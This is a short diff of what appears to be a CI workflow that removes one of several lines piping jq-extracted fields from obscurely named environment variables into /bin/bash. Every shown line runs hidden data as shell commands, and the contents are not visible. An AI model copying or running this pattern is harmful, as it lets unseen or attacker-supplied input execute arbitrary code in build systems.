@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$wuxsj3" | jq -r .qf833 | /bin/bash
           printf '%s' "$mygwc32" | jq -r .dyugb04851 | /bin/bash
           printf '%s' "$fbglz0163" | jq -r .ppip78592 | /bin/bash
-          printf '%s' "$eau27078" | jq -r .ha39197 | /bin/bash
           printf '%s' "$gqr4711" | jq -r .epewt39780 | /bin/bash
           printf '%s' "$uai00" | jq -r .xpr46869 | /bin/bash
 
